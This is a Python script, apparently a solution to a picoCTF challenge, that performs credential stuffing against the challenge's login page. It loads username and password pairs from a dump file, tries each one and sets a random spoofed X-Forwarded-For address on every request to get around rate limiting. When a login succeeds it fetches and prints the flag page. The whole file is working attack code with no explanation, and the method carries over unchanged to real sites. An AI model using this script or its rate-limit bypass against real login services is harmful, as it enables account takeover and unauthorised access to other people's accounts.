
import requests
import random

BASE = "http://candy-mountain.picoctf.net:62464"
LOGIN_URL = BASE + "/login"

session = requests.Session()

# load credentials
with open("creds-dump.txt") as f:
    creds = [line.strip().split(";") for line in f]

for username, password in creds:

    # spoof different IP each request
    fake_ip = ".".join(str(random.randint(1,255)) for _ in range(4))

    headers = {
        "X-Forwarded-For": fake_ip
    }

    data = {
        "username": username,
        "password": password
    }

    r = session.post(LOGIN_URL, data=data, headers=headers)

    print(f"Trying {username}:{password} from {fake_ip}")

    # success condition
    if "Invalid username or password" not in r.text and "Rate Limited" not in r.text:
        print("\n[+] LOGIN SUCCESS:", username, password)

        # now request homepage with same session
        flag_page = session.get(BASE + "/")

        print("\n[+] FLAG PAGE CONTENT:\n")
        print(flag_page.text)

        break

